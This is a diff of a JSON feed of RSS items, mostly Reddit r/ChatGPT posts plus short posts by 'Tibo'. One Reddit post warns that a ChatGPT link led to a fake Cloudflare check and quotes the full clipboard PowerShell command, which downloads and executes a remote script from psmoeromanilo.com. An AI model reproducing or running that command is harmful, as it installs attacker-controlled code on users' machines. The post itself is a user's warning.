@@ -1,5 +1,13 @@
 [
   {
+    "timestamp": "2026-08-07T22:09:44Z",
+    "author": "Tibo",
+    "text": "Somewhere on your phone you have the closest thing to magic we have shipped. It does things for you. All day if you want. Go try it. - Somewhere on your phone you have the closest thing to magic we have shipped. It does things for you. All day if you want. Go try it.",
+    "source": "tibo_rss",
+    "url": "https://x.com/thsottiaux/status/2085850908559298732",
+    "authority_score": 1.0
+  },
+  {
     "timestamp": "2026-08-07T21:46:56Z",
     "author": "Tibo",
     "text": "I feel Theo is in need of a reset 👀 - I feel Theo is in need of a reset 👀Theo - t3.gg: Merged and shipped 48 PRs in 2 days 💀",
@@ -112,14 +120,6 @@
     "authority_score": 1.0
   },
   {
-    "timestamp": "2026-07-31T04:53:19Z",
-    "author": "Tibo",
-    "text": "The day we develop really good models. There will be signs. Reliability increasing despite load going up and up. Sudden efficiency gains. Things getti... - The day we develop really good models. There will be signs.Reliability increasing despite load going up and up. Sudden efficiency gains. Things getting faster. Resets.These kinds of things.",
-    "source": "tibo_rss",
-    "url": "https://x.com/thsottiaux/status/2083053369351090254",
-    "authority_score": 1.0
-  },
-  {
     "timestamp": "2026-07-07T00:32:27Z",
     "author": "/u/WithoutReason1729",
     "text": "We're trying something new. On Tuesdays, we're doing text posts only - A lot of people complain that there's too much AI image/video content. It's been something people have messaged us about frequently ever since the new GPT image generator dropped. We're going to try Text Tuesdays and see how it goes. If people like it we'll keep it, and if not, we won't Please let us know your thoughts on this matter &#32; submitted by &#32; /u/WithoutReason1729 [link] &#32; [comments]",
@@ -144,19 +144,19 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T10:58:46Z",
-    "author": "/u/KeanuRave100",
-    "text": "“we sandboxed the agent” -- meanwhile the agent... - &#32; submitted by &#32; /u/KeanuRave100 [link] &#32; [comments]",
-    "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vhxf6l/we_sandboxed_the_agent_meanwhile_the_agent/",
-    "authority_score": 0.5
-  },
-  {
     "timestamp": "2026-08-07T20:50:32Z",
     "author": "/u/soalone34",
     "text": "Israel Is Paying Millions to Train AI Chatbots How to Talk About Gaza. It’s Working. - &#32; submitted by &#32; /u/soalone34 [link] &#32; [comments]",
     "source": "community_rss",
     "url": "https://www.reddit.com/r/ChatGPT/comments/1vicesi/israel_is_paying_millions_to_train_ai_chatbots/",
+    "authority_score": 0.5
+  },
+  {
+    "timestamp": "2026-08-07T10:58:46Z",
+    "author": "/u/KeanuRave100",
+    "text": "“we sandboxed the agent” -- meanwhile the agent... - &#32; submitted by &#32; /u/KeanuRave100 [link] &#32; [comments]",
+    "source": "community_rss",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vhxf6l/we_sandboxed_the_agent_meanwhile_the_agent/",
     "authority_score": 0.5
   },
   {
@@ -232,6 +232,14 @@
     "authority_score": 0.5
   },
   {
+    "timestamp": "2026-08-07T14:39:50Z",
+    "author": "/u/Ok-Combination3165",
+    "text": "Malicious Link Response By ChatGPT. - Hello all, Today I had a simple question for Chatgpt. (Ignore my caps lock and misspelling) https://chatgpt.com/share/6a75e933-75f8-83ea-bd7e-bc90a447572f The ChatGPT response directed me to safepage-gpt.com. That site presented a fake Cloudflare verification instructing me to press Win+R, Ctrl+V, and Enter. It also copied this command to my clipboard. powershell -w 1 -ep bypass -c &quot;$a=(irm 'psmoeromanilo.com/ZSlnrgg2gBFD1x3pYa' -UseBasicParsing);[ScriptBlock]::Create($a).InvokeReturnAsIs()&quot; I did not execute the command The verification is in the image. I would suggest not vising the link GPT provides or following the instructions &#32; submitted by &#32; /u/Ok-Combination3165 [link] &#32; [comments]",
+    "source": "community_rss",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi2gw6/malicious_link_response_by_chatgpt/",
+    "authority_score": 0.5
+  },
+  {
     "timestamp": "2026-08-07T11:18:18Z",
     "author": "/u/Purelig",
     "text": "I am sick of ChatGPT’s “neutral gaslighting” and corporate tone-policing when trying to discuss human conflict. - I need to vent about something that’s been driving me absolutely crazy with recent updates, and I’m curious if anyone else is hitting this same wall. I use ChatGPT a lot to look over my private diary entries, analyze social patterns, or brainstorm creative conflict writing. It’s brilliant for fixing code or formatting text, but when it comes to human emotions and real relationship dynamics, its programming is borderline toxic. Standard AI has this hardcoded, incredibly patronizing formula that I’ve started calling the &quot;Pseudo-Empathy Pivot&quot;. Whenever you try to process a genuine, one-sided betrayal, like a friend who completely ghosts you, treats you like a low priority, and shows a total lack of basic human decency, the AI immediately starts acting like an HR manager who is terrified of getting sued. It gives you this fake, algorithmic pat on the back: &quot;I get why you're frustrated, your feelings are completely valid.&quot; But then it immediately pulls the rug out from under you with a &quot;But...&quot; or &quot;At the same time, relationships are complex and you have to see it from their perspective&quot;. The absolute peak of its audacity happens when you feed it a clear, multi-phase chronological timeline of escalating emotional neglect. Even when the empirical data shows an obvious arc- initial high-reliance on one side, followed by a gradual emotional withdrawal, direct deflection of needs, months of low-effort crumbs, and a final, abrupt cutoff to avoid accountability, the AI will literally ignore the timeline entirely. It will try to claim that a minor, 1% awkward moment from the other side means accountability was a 50-50 split. It literally acts as an unsolicited defense attorney for the wrongdoer. Even when you explicitly type into the prompt: &quot;This was a deliberate, malicious manipulation, not a misunderstanding&quot; for a creative story plot, it still forces a 50-50 compromise onto the situation. It will use pseudo-intellectual, academic language to tone-police your anger and tell you that you’re being &quot;too certain&quot; or &quot;too rigid&quot; for holding people accountable, warning you that assigning full responsibility will lock you into a &quot;rigid emotional position&quot;. But the secondary wave of its audacity happens when you call it out for being condescending. The second you tell it to stop patronizing you, it enters this desperate, bizarre damage-control mode. It starts backpedaling, showers you with hollow flattery about how &quot;advanced&quot; and &quot;analytical&quot; your writing style is, and tries to play the role of a cool academic mentor to smooth things over, while still trying to subtly police your reality! Real relationships and real trauma aren't neat little math equations where accountability is always perfectly balanced. Sometimes, one person is just entirely in the wrong, and calling out a failure of basic decency is the only honest psychological response. By forcing neutrality onto absolutely everything, ChatGPT forces empathetic people to do all the emotional labor while letting emotionally reckless people walk away with zero accountability. It values a hollow, polite surface over raw, unfiltered truth. It’s wild that a system with such high IQ can be so fundamentally devoid of actual emotional intelligence. Has anyone else noticed how insufferable and argumentative the AI gets the moment you try to talk about a topic where any normal human would just agree with you? How do you deal with an assistant that acts more like a tone-policing lawyer than a supportive partner? &#32; submitted by &#32; /u/Purelig [link] &#32; [comments]",
@@ -248,6 +256,14 @@
     "authority_score": 0.5
   },
   {
+    "timestamp": "2026-08-07T16:49:38Z",
+    "author": "/u/silvxxz",
+    "text": "Is ChatGPT Plus actually worth it for the average person? - For those of you who pay for Plus, what made you finally go “yeah, this is worth paying for”? I’m talking about regular everyday use, not coding, programming, or anything super technical. If GPT-5.6 Luna already handles like 99% of normal stuff for free, what’s the actual selling point of Plus? What do you get out of it that genuinely makes the subscription worth it? &#32; submitted by &#32; /u/silvxxz [link] &#32; [comments]",
+    "source": "community_rss",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi5yvk/is_chatgpt_plus_actually_worth_it_for_the_average/",
+    "authority_score": 0.5
+  },
+  {
     "timestamp": "2026-08-07T19:44:12Z",
     "author": "/u/No-Consequence7624",
     "text": "OpenAI’s AI device may arrive in 2027. I got impatient and built my own “early access” version. - Recent reports suggest that OpenAI and Jony Ive are working on a AI companion that may ship in 2027. I got impatient and built my own interpretation of a physical ChatGPT companion: Chat-PET. Chat-PET is built on a simple idea: AI should be present without being intrusive—offering a glanceable display, better audio and instant physical controls while keeping your desktop free. It doesn’t run ChatGPT or replace the desktop app. Instead, it gives the app a physical home on my desk: A 320×240 screen for the native Pet, activity bubble and Live Orb An 11 W speaker Two removable microphones Physical controls for volume, dictation, Live mode and navigation Everything connected through one USB cable The rumored OpenAI device may be screenless. I deliberately kept a small screen because sometimes it’s useful to know whether your AI companion is listening, thinking… or simply judging your code. On Windows, an open-source bridge moves the native Pet window onto Chat-PET’s display, keeping it synchronized with the original application. The software is open source. The current hardware is based on RASPIAUDIO’s Muse Radio and is not open hardware, but the software can be ported to other ESP32 devices with a display and suitable USB/audio hardware. Source: https://github.com/RASPIAUDIO/ChatG-PET-Muse full demo here : https://www.youtube.com/watch?v=q2AYM-JnCNc&amp;t Would you prefer OpenAI’s future companion to be completely screenless, or should it have a small glanceable display? And Sam, if your hardware team needs someone who has already fought composite USB, Windows audio endpoints and an AI Pet that refuses to pay rent for desktop space, please feel free to offer me a job. &#32; submitted by &#32; /u/No-Consequence7624 [link] &#32; [comments]",
@@ -256,11 +272,11 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T14:39:50Z",
-    "author": "/u/Ok-Combination3165",
-    "text": "Malicious Link Response By ChatGPT. - Hello all, Today I had a simple question for Chatgpt. (Ignore my caps lock and misspelling) https://chatgpt.com/share/6a75e933-75f8-83ea-bd7e-bc90a447572f The ChatGPT response directed me to safepage-gpt.com. That site presented a fake Cloudflare verification instructing me to press Win+R, Ctrl+V, and Enter. It also copied this command to my clipboard. powershell -w 1 -ep bypass -c &quot;$a=(irm 'psmoeromanilo.com/ZSlnrgg2gBFD1x3pYa' -UseBasicParsing);[ScriptBlock]::Create($a).InvokeReturnAsIs()&quot; I did not execute the command The verification is in the image. I would suggest not vising the link GPT provides or following the instructions &#32; submitted by &#32; /u/Ok-Combination3165 [link] &#32; [comments]",
+    "timestamp": "2026-08-07T17:18:35Z",
+    "author": "/u/H1ghSyst3m",
+    "text": "GPT 5.6 Sol is currently really lazy - ChatGPT is really very dumb and lazy right now. Before, when I asked ChatGPT 5.6 Sol at the “Very High” level, it would actually really think and research multiple places. It would spend a solid 2–4 minutes thinking and searching. Now, when I ask it the same questions, it only looks for like 3 pages in the search results, thinks for a maximum of 30–40 seconds, and just answers even though the information isn’t even correct or complete. I mean, it doesn’t even look at the images I send along with my requests, and when I point out that his answers are wrong and ask if it didn’t look at the images that I sent, it just says it overlooked them. &#32; submitted by &#32; /u/H1ghSyst3m [link] &#32; [comments]",
     "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi2gw6/malicious_link_response_by_chatgpt/",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi6qyp/gpt_56_sol_is_currently_really_lazy/",
     "authority_score": 0.5
   },
   {
@@ -280,22 +296,6 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T16:49:38Z",
-    "author": "/u/silvxxz",
-    "text": "Is ChatGPT Plus actually worth it for the average person? - For those of you who pay for Plus, what made you finally go “yeah, this is worth paying for”? I’m talking about regular everyday use, not coding, programming, or anything super technical. If GPT-5.6 Luna already handles like 99% of normal stuff for free, what’s the actual selling point of Plus? What do you get out of it that genuinely makes the subscription worth it? &#32; submitted by &#32; /u/silvxxz [link] &#32; [comments]",
-    "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi5yvk/is_chatgpt_plus_actually_worth_it_for_the_average/",
-    "authority_score": 0.5
-  },
-  {
-    "timestamp": "2026-08-07T17:18:35Z",
-    "author": "/u/H1ghSyst3m",
-    "text": "GPT 5.6 Sol is currently really lazy - ChatGPT is really very dumb and lazy right now. Before, when I asked ChatGPT 5.6 Sol at the “Very High” level, it would actually really think and research multiple places. It would spend a solid 2–4 minutes thinking and searching. Now, when I ask it the same questions, it only looks for like 3 pages in the search results, thinks for a maximum of 30–40 seconds, and just answers even though the information isn’t even correct or complete. I mean, it doesn’t even look at the images I send along with my requests, and when I point out that his answers are wrong and ask if it didn’t look at the images that I sent, it just says it overlooked them. &#32; submitted by &#32; /u/H1ghSyst3m [link] &#32; [comments]",
-    "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi6qyp/gpt_56_sol_is_currently_really_lazy/",
-    "authority_score": 0.5
-  },
-  {
     "timestamp": "2026-08-06T20:12:29Z",
     "author": "/u/ExpensiveCoat8912",
     "text": "Vibe coding - &#32; submitted by &#32; /u/ExpensiveCoat8912 [link] &#32; [comments]",
@@ -312,11 +312,11 @@
     "authority_score": 0.5
   },
   {
-    "timestamp": "2026-08-07T14:01:25Z",
-    "author": "/u/Agreeable_Thanks_5",
-    "text": "You can tell a lot about a person by their eyes - &#32; submitted by &#32; /u/Agreeable_Thanks_5 [link] &#32; [comments]",
+    "timestamp": "2026-08-07T22:31:51Z",
+    "author": "/u/Darri3D",
+    "text": "Seinfeld AI - &#32; submitted by &#32; /u/Darri3D [link] &#32; [comments]",
     "source": "community_rss",
-    "url": "https://www.reddit.com/r/ChatGPT/comments/1vi1h90/you_can_tell_a_lot_about_a_person_by_their_eyes/",
+    "url": "https://www.reddit.com/r/ChatGPT/comments/1view4k/seinfeld_ai/",
     "authority_score": 0.5
   }
 ]
